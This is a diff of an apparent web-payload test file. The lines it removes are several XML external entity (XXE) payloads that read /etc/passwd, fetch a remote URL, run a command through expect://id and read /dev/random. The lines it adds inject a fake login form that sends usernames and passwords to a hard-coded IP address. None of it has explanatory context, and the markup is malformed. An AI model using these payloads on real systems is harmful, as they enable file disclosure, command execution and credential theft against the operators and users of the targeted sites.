@@ -2,80 +2,10 @@
 
 <html>
 <body>
-<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
-<!DOCTYPE foo 
-[<!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<FUNCTION>
-<NAME>&xxe;</NAME>
-</FUNCTION>
+
+<h3>Please login to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
+
+
 </body>
 </xml>
 </html>
-
-
-<html>
-<body>
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<stockCheck><productId>&xxe;</productId></stockCheck>
-</body>
-</xml>
-</html>
-
-<html>
-<body>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://en.wikipedia.org/"> ]>
-</body>
-</xml>
-</html>
-
-
-<html>
-<body>
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-<foo>&xxe;</foo>
-</body>
-</xml>
-</html>
-
-<html>
-<body>
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo
-  [<!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM "expect://id" >]>
-<creds>
-  <user>`&xxe;`</user>
-  <pass>`mypass`</pass>
-</creds>
-</body>
-</xml>
-</html>
-
-<html>
-<body>
-<?xml  version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-   <!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
-<foo>&xxe;</foo>
-</body>
-</xml>
-</html>
-
-
-
-
-
-
-
-
-```xml
-<myxml>
-   <someElement />  
-</myxml>
-```
